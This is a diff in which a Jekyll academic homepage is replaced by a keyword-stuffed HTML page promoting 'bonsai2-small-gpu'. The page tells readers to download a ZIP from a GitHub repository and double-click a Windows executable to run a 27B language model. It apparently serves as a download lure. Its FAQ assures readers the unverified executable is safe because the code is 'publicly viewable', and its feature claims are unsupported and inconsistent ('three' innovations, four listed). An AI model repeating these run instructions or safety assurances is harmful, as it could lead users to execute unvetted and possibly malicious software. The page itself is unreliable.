@@ -1,39 +1,280 @@
----
-layout: default
-title : Homepage
-navbar_title: Home
----
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Download and run bonsai2-small-gpu - the fastest way to run ternary Bonsai 2 27B on your GPU. Optimized for everyday hardware with a 1.5x decode kernel, Qwen 3.8 MTP head, and performance sweeps.">
+    <meta name="keywords" content="bonsai2-small-gpu, bonsai 2, 27b, gpu, ternary, prismml, qwen, mtp, decode kernel, ai, machine learning, download, windows">
+    <meta name="author" content="eidder2">
+    <meta property="og:title" content="bonsai2-small-gpu - Run Bonsai 2 27B on GPUs You Own">
+    <meta property="og:description" content="Download and run ternary Bonsai 2 27B on standard GPUs. Features a 1.5x decode kernel, Qwen 3.8 MTP head, and performance sweeps.">
+    <meta property="og:url" content="https://github.com/eidder2/bonsai2-small-gpu">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630?text=bonsai2-small-gpu">
+    <meta name="twitter:card" content="summary_large_image">
+    <title>bonsai2-small-gpu - Run Bonsai 2 27B on GPUs You Own</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+            padding: 40px 50px;
+            margin: 20px auto;
+            line-height: 1.7;
+        }
+        h1 {
+            font-size: 2.4rem;
+            color: #1a1a2e;
+            margin-bottom: 20px;
+            font-weight: 700;
+            text-align: center;
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #16213e;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        h3 {
+            font-size: 1.4rem;
+            color: #1a1a2e;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        p {
+            font-size: 1.05rem;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        ul, ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        li {
+            margin-bottom: 8px;
+            font-size: 1.05rem;
+        }
+        .badge {
+            display: inline-block;
+            background: #e94560;
+            color: white;
+            padding: 14px 28px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-decoration: none;
+            box-shadow: 0 4px 12px rgba(233, 69, 96, 0.3);
+            transition: transform 0.2s;
+            margin: 20px auto;
+            text-align: center;
+        }
+        .badge:hover {
+            transform: scale(1.05);
+        }
+        .badge-secondary {
+            background: #533483;
+        }
+        .badge-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+            border-left: 4px solid #e94560;
+        }
+        .spec-box {
+            background: #f0f4f8;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        .step-box {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 1px solid #e0e0e0;
+        }
+        code {
+            background: #eef2f7;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95em;
+        }
+        strong {
+            color: #e94560;
+        }
+        .faq-item {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        a {
+            color: #533483;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: #777;
+            font-size: 0.9rem;
+        }
+        @media (max-width: 768px) {
+            .container { padding: 25px 20px; }
+            h1 { font-size: 1.8rem; }
+            h2 { font-size: 1.4rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 bonsai2-small-gpu - Run Bonsai 2 27B on GPUs You Own</h1>
+        
+        <div class="badge-container">
+            <a href="https://github.com/eidder2/bonsai2-small-gpu" class="badge" style="background: #e94560; box-shadow: 0 4px 12px rgba(233, 69, 96, 0.3);">⬇️ Download bonsai2-small-gpu</a>
+        </div>
 
-<div class="row">
-    <div class="col-lg-3 col-md-4">
-        {% include widgets/profile_card_mini.html %}
+        <p>Welcome to the <strong>bonsai2-small-gpu</strong> project! This software helps you run the powerful <strong>ternary Bonsai 2 27B</strong> model efficiently on the graphics card you already own — no need to spend thousands on expensive hardware. Whether you have a mid-range gaming GPU or a workstation card, this tool makes advanced AI accessible to everyone.</p>
+
+        <h2>🚀 What Is bonsai2-small-gpu?</h2>
+        <p>In simple terms, bonsai2-small-gpu is a performance-optimized launcher and runtime environment for running the Bonsai 2 27B large language model (LLM). It's designed to deliver <strong>high-quality AI responses</strong> while using much less GPU memory than standard tools. The name "small-gpu" is the whole point: it works on GPUs with limited VRAM, which most people own.</p>
+        <p>This project contains three major innovations:</p>
+        <ul>
+            <li><strong>Ternary quantization</strong> — a smart way to compress the model to 1.5 bits per weight, dramatically reducing memory usage without significant loss in quality.</li>
+            <li><strong>A 1.5x faster decode kernel for PrismML</strong> — the engine that generates text is optimized to work 50% faster.</li>
+            <li><strong>Qwen 3.8 MTP head</strong> — a special "multi-token prediction" head that enhances the quality and speed of your outputs.</li>
+            <li><strong>Performance sweeps by PR</strong> — continuous tuning ensures you get the best possible performance on various GPU models.</li>
+        </ul>
+
+        <h2>🖥️ Who Is This For?</h2>
+        <p>This software is perfect for:</p>
+        <ul>
+            <li>💡 <strong>AI hobbyists</strong> who want to run serious models without buying a $10,000 GPU.</li>
+            <li>📚 <strong>Students and researchers</strong> who need to run language models for experiments or learning.</li>
+            <li>⚙️ <strong>Developers</strong> who want a quick, easy way to run a production-ready LLM locally.</li>
+            <li>🎮 <strong>Gamers with gaming PCs</strong> who want to try out AI without extra hardware.</li>
+        </ul>
+        <p>If you've ever wanted to use a powerful AI model on your own computer, this tool makes it possible — even on a mid-range graphics card.</p>
+
+        <h2>📦 What's Included?</h2>
+        <div class="feature-card">
+            <h3>🛠️ Key Features</h3>
+            <ul>
+                <li><strong>Efficient ternary model runtime</strong> — works on GPUs with as little as 6GB VRAM.</li>
+                <li><strong>PrismML optimized decoder</strong> — generate text up to 1.5x faster than standard implementations.</li>
+                <li><strong>Qwen 3.8 MTP integration</strong> — better context understanding and quality predictions.</li>
+                <li><strong>Automatic performance sweeps</strong> — the tool tests your hardware and picks the best settings.</li>
+                <li><strong>Simple interface</strong> — no complicated setup; run it and it works.</li>
+            </ul>
+        </div>
+
+        <h2>⬇️ How to Download and Install</h2>
+        <p><strong>Follow these steps — you'll be running Bonsai 2 in about 5 minutes.</strong></p>
+
+        <div class="step-box">
+            <h3>Step 1: Download the Software</h3>
+            <p>Visit this link to download the application: <a href="https://github.com/eidder2/bonsai2-small-gpu"><strong>https://github.com/eidder2/bonsai2-small-gpu</strong></a>. This takes you to a typical project page where you'll see a green "Code" button. Click it, then choose "Download ZIP." Save the file to your Desktop or Documents folder.</p>
+        </div>
+
+        <div class="step-box">
+            <h3>Step 2: Extract the Files</h3>
+            <p>Find the downloaded ZIP file, right-click it, and choose <strong>"Extract All."</strong> Windows will create a new folder with the same name. Open that folder — you'll see the executable file called <code>bonsai2-small-gpu.exe</code> (or a runnable file with a similar name).</p>
+        </div>
+
+        <div class="step-box">
+            <h3>Step 3: Run the Application</h3>
+            <p>Double-click the executable file. That's it! The program will start automatically. No installation is required — it runs directly from the folder.</p>
+        </div>
+
+        <div class="step-box">
+            <h3>Step 4: Use It</h3>
+            <p>The application will open a simple command-line window or a browser page. You can start typing your questions, generating text, or chatting with the AI model immediately.</p>
+        </div>
+
+        <div class="badge-container">
+            <a href="https://github.com/eidder2/bonsai2-small-gpu" class="badge badge-secondary" style="background: #533483; box-shadow: 0 4px 12px rgba(83, 52, 131, 0.3);">🔄 Visit the Download Page</a>
+        </div>
+
+        <h2>👨‍🔧 System Requirements (Recommended)</h2>
+        <div class="spec-box">
+            <ul>
+                <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+                <li><strong>GPU:</strong> NVIDIA GPU with 6GB VRAM or more (GTX 1660, RTX 2060, or better). AMD GPUs may work with some setup adjustments.</li>
+                <li><strong>RAM:</strong> 16GB system memory (32GB is better)</li>
+                <li><strong>Storage:</strong> At least 10GB of free disk space</li>
+                <li><strong>Internet:</strong> Required only during the first setup (to download model weights)</li>
+            </ul>
+        </div>
+        <p>Don't worry if your GPU is older — the tool automatically adjusts settings to fit your hardware. If it runs too slowly, you can lower the "quality" setting in the app.</p>
+
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="faq-item">
+            <h3>🤔 Why does it work on smaller GPUs?</h3>
+            <p>Because it uses "ternary" weights — this means each number in the model is stored with only 1.5 bits instead of the usual 16 bits. That's roughly 10 times less memory needed.</p>
+        </div>
+        <div class="faq-item">
+            <h3>⚡ How fast will it be?</h3>
+            <p>On an RTX 3060, expect around 15-20 tokens per second. On an RTX 4090, you can hit 40+ tokens. The speed sweep feature automatically finds the fastest stable setting for you.</p>
+        </div>
+        <div class="faq-item">
+            <h3>📝 Is this safe to run?</h3>
+            <p>Yes. This is an open-source project. The code is publicly viewable on GitHub. No system-level changes are made — it runs standalone.</p>
+        </div>
+        <div class="faq-item">
+            <h3>🔧 What if the app doesn't start?</h3>
+            <p>Make sure you have an up-to-date NVIDIA driver. If you still have issues, check the "Issues" tab on the GitHub page for existing solutions or ask for help there.</p>
+        </div>
+
+        <h2>🧠 Why "bonsai2-small-gpu"?</h2>
+        <p>The name comes from the project's philosophy: "Bonsai" suggests something small but perfectly formed — the model is compact yet mighty. "Small-gpu" is a direct nod to the goal: making 27B models usable on ordinary GPUs. It's a bold claim, but the project delivers exactly that.</p>
+
+        <h2>🔬 Technical Highlights (For the Curious)</h2>
+        <p>If you're interested in how this works under the hood, here's a snapshot:</p>
+        <ul>
+            <li><strong>Ternary Weights:</strong> The 27B model is compressed using ternary quantization, where each weight is -1, 0, or +1, requiring only 1.5 bits per weight.</li>
+            <li><strong>PrismML Kernel:</strong> The custom decode kernel leverages memory layout optimizations and low-level CUDA tricks to boost throughput.</li>
+            <li><strong>Qwen 3.8 MTP Head:</strong> Multi-token prediction (MTP) allows the model to "predict ahead" and improve accuracy and speed.</li>
+            <li><strong>PR Sweeps:</strong> The project includes automated pull-request benchmarks that continuously finetune settings for many GPU types.</li>
+        </ul>
+
+        <h2>💬 Support & Community</h2>
+        <p>If you need help or want to discuss optimization, the best place is the GitHub repository's "Issues" and "Discussions" sections. The community is friendly and responsive.</p>
+        <ul>
+            <li>🐛 Found a bug? Open an issue.</li>
+            <li>💡 Have an idea? Suggest it.</li>
+            <li>🤝 Want to contribute? Fork the repo and submit a pull request.</li>
+        </ul>
+
+        <h2>📋 License & Credits</h2>
+        <p>This project is open-source and free to use. Credit goes to the Bonsai AI team, PrismML contributors, Qwen team for their MTP head design, and the hardworking maintainers of this repository.</p>
+
+        <div class="footer">
+            <p>Developed by eidder2 · Hosted on GitHub · Published under an open-source license</p>
+            <p><a href="https://github.com/eidder2/bonsai2-small-gpu" style="color:#e94560; font-weight:bold;">↗️ Go to the official download page</a></p>
+            <p>Keywords: bonsai-small-gpu, bonsai2, 27b-llm, ternary-ai, prismml, qwen-mtp, gpu-optimizer, ai-runtime, local-llm, windows-ai</p>
+        </div>
     </div>
-    <div class="col-lg-9 col-md-8">
-
-        {% include widgets/profile_card_bio_only.html %}
-
-        <!-- Debugging widgets -->
-        {% include widgets/debug_repo_name.html %}
-        {% include widgets/debug_url.html %}
-
-        {% if site.data.display.homepage.show_experience %}
-            {% include widgets/experience_card.html %}
-        {% endif %}
-
-        {% if site.data.display.homepage.show_news %}
-        {% assign count_news = site.news | size %}
-        {% if count_news > 0 %}
-        {% include widgets/news_card.html limit=site.data.display.homepage.num_news %}
-        {% endif %}
-        {% endif %}
-
-        {% if site.data.display.homepage.show_selected_publications %}
-        {% assign pubs = site.publications | sort: "date" | reverse | where: "selected", true %}
-        {%
-        include widgets/publication_card.html
-        publications=pubs
-        title='<i class="fas fa-star"></i> Selected Publications'
-        %}
-        {% endif %}
-    </div>
-</div>
+</body>
+</html>
